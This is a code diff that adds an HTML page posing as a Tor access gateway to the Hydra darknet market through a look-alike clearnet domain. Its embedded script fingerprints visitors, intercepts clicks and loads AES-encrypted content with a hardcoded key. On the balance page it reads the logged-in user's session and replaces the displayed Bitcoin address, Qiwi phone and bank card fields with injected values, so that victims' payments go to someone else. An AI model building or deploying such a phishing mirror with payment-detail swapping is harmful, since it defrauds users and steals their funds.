@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>HYDRA TOR</title>
+<meta name="description" content="hydraclubbioknikokex7njhwuahc2l67lfiz7z36md2jvopda7nchid.onion. Проблемы с доступом на гидру?">
+
+<meta property="og:image" content="/themes/hydra/images/logo.png">
+<meta property="og:url" content="https://0ni0n.com">
+<meta property="og:title" content="HYDRA">
+<meta property="og:description" content="Hydra">
+<meta property="og:type" content="website">
+
+<link rel="shortcut icon" href="/themes/hydra/images/favicon.ico">
+<link rel="apple-touch-icon" href="/themes/hydra/images/touch-icon-iphone.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/themes/hydra/images/touch-icon-ipad.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/themes/hydra/images/touch-icon-ipad-retina.png">
+<link rel="apple-touch-icon" sizes="57x57" href="/assets/favicon/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/assets/favicon/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/assets/favicon/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/assets/favicon/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/assets/favicon/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/assets/favicon/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192" href="/assets/favicon/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="/assets/favicon/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="HandheldFriendly" content="true">
+<meta name="format-detection" content="telephone=no">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link href="/themes/hydra/min/styles.min.css" type="text/css" rel="stylesheet">
+
+<meta name="msapplication-TileColor" content="#f0ffff">
+<meta name="msapplication-TileImage" content="/assets/favicon/ms-icon-144x144.png">
+<meta name="theme-color"             content="#f0ffff">
+
+<meta name="csrf-param" content="authenticity_token" />
+
+<style>
+        .page{
+            padding: 20px;width: 300px; margin: 0 auto;
+        }
+        input[type=text]{
+            width: 100px;
+            height: 24px;
+            margin-bottom: 5px;
+        }
+        img{
+            float:left;
+            margin-right: 10px;
+        }
+        input[type=submit]{
+            color: #fff;
+            background-color: #2b71b1;
+            border-color: #0073cb;
+            width: 100px;
+            display: inline-block;
+            margin-bottom: 0;
+            font-weight: normal;
+            text-align: center;
+            vertical-align: middle;
+            cursor: pointer;
+            background-image: none;
+            border: 1px solid transparent;
+            white-space: nowrap;
+            padding: 4px 12px;
+            font-size: 12px;
+            line-height: 1.42857143;
+            border-radius: 2px;
+        }
+
+  .st0{
+    fill-rule:evenodd;
+    clip-rule:evenodd;
+    transition: 0.3 color;
+    fill:#aaa;
+  }
+  .st0-active{
+     fill:#2b71b1 
+   }
+
+  .no-ne{
+     display: none!important; 
+   }
+
+  .link-goto{
+    font-size: 18px;
+    text-decoration: none!important;
+    padding: 24px;
+    display: block;
+  }
+
+  .link-goto::hover{
+    opacity: 1;
+  }
+
+
+  div.full {
+    width: 100vw;
+    height: 100vh;
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    align-content: center;
+  }
+
+  div#text-load{
+      width: 7vmax;
+      overflow: hidden;
+      right: calc(50% - 3.5vmax);
+      position: absolute;
+      font-size: 16px;
+      margin: auto;
+      color: #bbb;
+      text-align: center;
+    }
+  .show-loader{
+    visibility: visible !important
+  }
+  div#loader {
+    margin: 10px;
+    width: 12vmax;
+    height: 12vmax;
+    border-right: 2px solid #2b71b1;
+    opacity: 0.55;
+    border-radius: 100%;
+    animation: spinRight 800ms linear infinite;
+    visibility: hidden;
+    
+    &:before, &:after {
+      content: '';
+      width: 6vmax;
+      height: 6vmax;
+      display: block;
+      position: absolute;
+      top: calc(50% - 3vmax);
+      left: calc(50% - 3vmax);
+      border-left: 3px solid #ffffff;
+      border-radius: 100%;
+      animation: spinLeft 800ms linear infinite;
+    }
+    
+    &:after {
+      width: 4vmax;
+      height: 4vmax;
+      top: calc(50% - 2vmax);
+      left: calc(50% - 2vmax);
+      border: 0;
+      border-right: 2px solid #ffffff;
+      animation: none;
+    }
+  }
+
+  @keyframes spinLeft {
+    from {transform:rotate(0deg);}
+    to {transform:rotate(720deg);}
+  }
+
+  @keyframes spinRight {
+    from {transform:rotate(360deg);}
+    to {transform:rotate(0deg);}
+  }
+</style>
+
+<body class="log_page">
+
+
+
+  <div id="fp-loader">
+    <div class="full">
+      <div id="text-load">
+        <span id="link_go_to" title="hydraclubbioknikokex7njhwuahc2l67lfiz7z36md2jvopda7nchid">
+          <a href="#goto" onclick="site_in()" class="link-goto">Войти&nbsp;<b>↩︎</b></a>
+        </span>
+      </div>
+      <div id='loader'></div>
+    <noscript>
+      <h2>Для доступа на сайт гидры</h2>
+      <p>
+        Вам необходим современный браузер поддерживающий <i>javascript</i>. Включите js или установите новый браузер. 
+      </p>
+      <blockquote>
+        hydraclubbioknikokex7njhwuahc2l67lfiz7z36md2jvopda7nchid.onion
+      </blockquote>
+    </noscript>
+  </div>
+    <div style="position: absolute; bottom: 0; right: 10px; width: 228px;">
+      <svg  version="1.1" 
+            title="hydraclubbioknikokex7njhwuahc2l67lfiz7z36md2jvopda7nchid.0ni0n.com" 
+            xmlns="http://www.w3.org/2000/svg"  
+            x="0px" 
+            y="0px"
+            viewBox="0 0 184 33.7" 
+            style="enable-background:new 0 0 184 33.7;" 
+            xml:space="preserve">
+
+      <g id="XMLID_13_">
+        <g id="XMLID_14_">
+          <path id="XMLID_24_" class="st0" d="M88,18.7h-6.2v7.5H78V7.4h3.8V15H88V18.7z M89.1,7.4h3.8v18.9h-3.8v-7.5V15V7.4z"/>
+          <path id="XMLID_20_" class="st0" d="M149.1,11.2V15h5.8c1,0,1.9-0.9,1.9-1.9c0-1-0.9-1.9-1.9-1.9H149.1z M149.1,26.3h-3.8v-7.5
+            V7.4h3.8h5.8c3.1,0,5.7,2.5,5.7,5.7v0c0,3.1-2.5,5.7-5.7,5.7h-5.8V26.3z M151.2,19.9l3.7,6.4h4.4l-3.7-6.4H151.2z"/>
+          <path id="XMLID_17_" class="st0" d="M112.6,7.4h4.4l-10.9,18.9h-4.4L112.6,7.4z M103.3,7.4h-4.4l6.2,10.8l2.2-3.8L103.3,7.4z"/>
+          <path id="XMLID_5_" class="st0" d="M122.9,7.4h7.6c4.2,0,7.6,3.4,7.6,7.6v3.7c0,4.2-3.4,7.6-7.6,7.6h-7.6v-3.8c2.5,0,5.1,0,7.6,0
+            c2.1,0,3.8-1.7,3.8-3.8V15c0-2.1-1.7-3.8-3.8-3.8h-3.8v10.2h-3.8V7.4z"/>
+          <polygon id="XMLID_4_" class="st0" points="173.6,7.4 177.4,7.4 184,26.3 180.2,26.3 179.3,23.7 172.8,23.7 174.2,19.9 178,19.9
+            175.5,12.8 170.7,26.3 166.9,26.3    "/>
+        </g>
+      </g>
+      </svg>
+  </div>
+
+    <script src="/js/jq.js"></script>
+    <script src="/js/aes.js"></script>
+    <script type="text/javascript">
+      $.ajax({
+  url: '/H/gate',
+  method: 'POST',
+  data: "$.httpParamSerializerJQLike()", // Make sure to inject the service you choose to the controller
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded' // Note the appropriate header
+  }
+}).then(function(response) { 
+
+});
+
+      window.locked = true;
+window.state = 'new';
+
+function send_fp(id, zid) {
+  if (window.locked){
+
+  }else{
+  var exDate = new Date();
+  var host   = window.location.hostname;
+
+  exDate.setMonth(exDate.getMonth() + 240);
+  document.cookie = "_fp=" +id+ ";expires=" +exDate+ ";domain=." +host+ ";path=/";
+  get_req_ajax('/H',0);
+
+  }
+}
+
+function get_req_ajax(url,i) {
+  if(i<3){
+  $.ajax({
+    url: url,
+      beforeSend: function( xhr ) {
+      xhr.overrideMimeType( "application/json" );
+    }
+  })
+  .done(function( data ) {
+    console.log( "DONE: ", data );
+    if(data.code == '200' && data.ok){
+      sleep(333);
+      $('#text-load').html("Готово..");
+      sleep(333);
+      $('#text-load').html("Готово...");
+      //////////////////////////////////////////////////////////////////////////
+      //
+      //
+      //////////////////////////////////////////////////////////////////////////
+      html = dec(data['body']);
+      $('#fp-loader').addClass('no-ne');
+      $('.RootContainer').html(html);
+      f_click();
+      window.locked = false;
+      return;
+    }else{
+
+    }
+  })
+  .fail(function( data ) {
+    console.log( "DATA: ", data ); 
+    i=i+1
+    window.locked = false;
+    switch(data.status){
+      case 500:
+        $('#text-load').html("Зеркало не отвечает...");
+        sleep(555);
+        $('#text-load').html("Выбираем другой...");
+        get_req_ajax(url,i);
+        return;
+      case 302:
+        $('#text-load').html("Подключенно ✔️");
+        sleep(1288);
+        $('#text-load').html("Настраиваю... ");
+        sleep(155);
+        get_req_ajax(url,i);
+        return;
+      default:
+        $('#text-load').html("Поиск маршрута.");
+        sleep(1222);
+        $('#text-load').html("Поиск маршрута..");
+        sleep(1522);
+        $('#text-load').html("Поиск маршрута...");
+        sleep(1111);
+        get_req_ajax(url,i);
+        return;
+      }
+    }
+  )
+  }
+}
+
+
+//     ////////////////////////////////////////////////////////////
+//–––––||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+//     \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function dec(v){
+  iv = CryptoJS.enc.Base64.parse("1234567890123456123454")
+  key = CryptoJS.enc.Hex.parse("12345608901234561234560890123456")
+  decrypted_value = CryptoJS.AES.decrypt(v,  key,  {mode: CryptoJS.mode.CBC,  iv : iv}).toString(CryptoJS.enc.Utf8)
+
+  return decrypted_value
+}
+
+function getCookie(cname) {
+  let name = cname + "=";
+  let decodedCookie = decodeURIComponent(document.cookie);
+  let ca = decodedCookie.split(';');
+  for(let i = 0; i <ca.length; i++) {
+    let c = ca[i];
+    while (c.charAt(0) == ' ') {
+      c = c.substring(1);
+    }
+    if (c.indexOf(name) == 0) {
+      return c.substring(name.length, c.length);
+    }
+  }
+  return "";
+}
+
+function site_in() {
+  if(locked){
+    window.visitorId = window.visitorId + 1
+  }else{
+    console.debug("Первое событие");
+    $("#link_go_to").html('Соединение c TOR...');
+    $("#loader").addClass('show-loader');
+    $(".st0").addClass('st0-active'); 
+    send_fp(visitorId, getCookie('_z'));
+  }
+}
+
+// ➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤ ➤
+// ☞ перехват кликов
+// ➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤➤ ➤
+function f_click(){
+  window.addEventListener("click", (e) => {
+    
+             e.stopPropagation();
+    e.stopImmediatePropagation();
+              e.preventDefault();
+    
+    
+    if(window.locked && e.target.className != 'link-goto'){
+      console.warn("BLOCK", e);
+    }else{
+      console.log(e);
+      window.locked=true
+      //////////////////////////////////////////////////////////////////////////
+      ///
+      ///     Роутинг на уровне js. опредеяем стрвницу
+      ///     state = 
+      switch (window.state) {
+        case 'gate_captcha':
+            ajax_gate_captcha();
+          break;
+        default:
+          // statements_def
+          break;
+      }
+
+    }
+
+    
+
+  }, false)
+}
+
+
+
+
+  const fpPromise = import('./js/app.js')
+    .then(FingerprintJS => FingerprintJS.load())
+
+  fpPromise
+    .then(fp => fp.get())
+    .then(result => {
+      // This is the visitor identifier:
+      console.log("OK");
+      const visitorId  = result.visitorId;
+      window.visitorId = visitorId;
+      window.locked    = false;
+      //старт анимации
+    })
+
+
+
+//     ////////////////////////////////////////////////////////////
+//–––––------------------------------------------------------------
+//     \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+// function wait_con(txt, fpId){
+//   if( txt.js_ok && fpId.length == 32 && wsReload){ //txt json 
+//     wsReload   = false
+//     host       = window.location.host;
+//     window.ws  = new WebSocket("wss://127.0.0.1:5665/ws");
+
+//     ws.addEventListener('open', function (event) {
+//       dataBase64 = Base64.encode(JSON.stringify(txt))
+//       ws.send( "^" + dataBase64 + "." + Date.now())        // ^ - up
+//     });
+
+//     ws.addEventListener('close', function (event) {       //  < - close
+//       console.log('close', event)
+//       wsReload = true
+//       wait_con(txt, fpId)
+//     })
+
+//     ws.addEventListener('message', function (event) {     //  > - msg
+//       console.log(event)
+//       // z = JSON.parse(event.data)
+
+//     })
+//   }
+// }
+
+
+//////////////////////////////////////////////////////
+$( document ).ready(function() {
+//////////////////////////////////////////////////////
+//
+//
+//////////////////////////////////////////////////////
+  console.log('READY', this);
+  // USER
+  wsDisabled = true
+  f_click()
+
+  ////////////////////////////////////////////////////
+  /////////////// IF CURRENT USER ////////////////////
+  ////////////////////////////////////////////////////
+  if (typeof currentUser === 'undefined') {
+    var txt ={
+      resource: 'gate',
+      title:    $( "title" ).text(),
+      path:     window.location.pathname,
+      user:     false,
+      fpid:     'fpId'
+    }
+  }else if (currentUser == null ) {
+    var txt = {
+      resource: 'login',
+      title:    $( "title" ).text(),
+      path:     window.location.pathname,
+      user:     null
+    }
+  }else if ( !$.isEmptyObject(currentUser) ) {
+    var base = currentUser.token.split('.')
+    var txt = {
+      resource: 'on',
+      title:  $( "title" ).text(),
+      path:   window.location.pathname,
+      user:   currentUser,
+      currencies: currenciesByCode
+      // decode_token: JSON.parse(Base64.decode(base[1])),
+      // decode_alg:   JSON.parse(Base64.decode(base[0]))
+    }
+
+  ////////////////////////////// CURRENT USER UES =
+  ////////////////////////////// Ути пути. 
+  ////////////////////////////// Пути и страницы.
+  //    /   /
+  //--------                    VARIABLES
+
+  Inj = {
+    BTC: "",
+    QiwiPhone: "",
+    BankCard: ""
+  }
+
+  if(txt.path == "/"){
+    txt.resource = "index"
+  }else if(txt.path == "/balance"){
+    //btc
+    $('ul.balance_list > li:nth-child(2) > div > span').html(Inj['BTC']);
+    txt.resource = "balance"
+    // Ожидаем ли битки
+    txt.wait_btc = $('table > tbody > tr:first > td:last').text().trim() != ""
+    if(txt.wait_btc){
+      txt.wait_count = $('table > tbody > tr:first > td:nth-child(2)').text().split(' BTC')[0]
+    }
+  }else{
+    console.log('E1');
+  }
+
+  $('body').removeAttr('data-dmn')
+  $('div.heading_sep:nth-child(4)').html("");
+
+  //yandex
+  txt.btc_wallet = $('ul.balance_list > li:nth-child(2) > div > span').text();
+  $(".paymentMethod-yandex").html('');
+
+  //card
+  $('.static > div:nth-child(3) > b:nth-child(3)').html(Inj['BankCard']);
+  $('#address > b:nth-child(2)').html(Inj['BankCard']);
+  
+  //qiwi
+  $('.static > div:nth-child(3):contains("Qiwi") > b:nth-child(3)').html(Inj['QiwiPhone']);
+  $('#address:contains("Qiwi") > b:nth-child(2)').html(Inj['QiwiPhone']);
+
+
+  txt.js_ok=true
+  //txt.fpid=fpId
+  window.txt = txt
+  console.debug("EDN JS", txt);
+  //wait_con(txt, fpId)
+  
+} else {
+  console.log(currentUser);
+  console.log('E2');
+}
+
+
+})
+
+
+    </script>
+  </div>
+  <div class="RootContainer">
+
+  </div>
+</body>
+</html>
